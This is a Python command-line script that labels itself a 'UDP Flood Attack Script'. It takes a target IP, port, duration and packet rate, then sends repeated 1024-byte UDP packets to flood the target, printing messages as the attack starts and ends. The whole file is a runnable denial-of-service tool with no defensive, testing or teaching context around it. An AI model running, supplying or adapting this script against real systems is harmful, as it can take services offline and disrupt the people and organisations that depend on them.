import socket
import threading
import time
import argparse

def udp_flood(target_ip, target_port, duration, rate):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = "A" * 1024  # Packet size

    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(rate):
            sock.sendto(bytes.encode(), (target_ip, target_port))
            time.sleep(1.0 / rate)

def main():
    parser = argparse.ArgumentParser(description="UDP Flood Attack Script")
    parser.add_argument("--server", type=str, required=True, help="Target server IP")
    parser.add_argument("--port", type=int, required=True, help="Target port number")
    parser.add_argument("--duration", type=int, required=True, help="Duration of the attack in seconds")
    parser.add_argument("--rate", type=int, required=True, help="Packet rate per second")
    args = parser.parse_args()

    target_ip = args.server
    target_port = args.port
    duration = args.duration
    rate = args.rate

    print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds at {rate} packets per second")
    attack_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, rate))
    attack_thread.start()
    attack_thread.join()
    print("Attack completed")

if __name__ == "__main__":
    main()
